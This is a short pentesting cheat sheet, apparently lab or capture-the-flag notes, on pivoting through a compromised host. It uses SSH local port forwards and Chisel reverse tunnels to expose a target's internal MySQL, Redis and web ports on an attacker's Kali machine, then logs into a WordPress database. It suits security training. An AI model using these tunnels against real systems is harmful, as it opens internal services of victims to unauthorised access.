# SSH  - Forward one local port (to the compromised host) 
```
ssh -L 1234:localhost:3306 ubuntu@<compromised_host>
```
 ```
 nmap -p 1234 -sVC localhost
```
#### Confirm port forward with netstat:
```
netstat -antp | grep 1234
```
#### Forward multiple ports:
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64 
```

---
# Chisel - Local port forwarding (reverse) 
Sometime we are in a container environment, we can connect to target from kali. We can do reverse connection in that case. 
#### On the kali 
```
chisel server -p 8000 -reverse
```
#### On the target 
```
chisel client 10.10.16.16:8000 R:80:172.19.0.4:80 R:6379:172.19.0.2:6379
```

---
# Chisel  - Local port forwarding
#### On kali machine 
Reverse server listen (works - forward 3306 to kali)
```
chisel server -p 8000 --reverse
```
#### On target machine (local port forwarding)
```
./chisel client 10.10.16.10:8000 33066:127.0.0.1:3306
```
>e.g. chisel client `<listen-ip>:<listen-port> <kali-port>:<local-ip>:<local-port>`

#### Access local port on kali 
```
mysql -D 'wordpress' -u 'wp_user' -h 172.17.0.1 --skip-ssl -p
```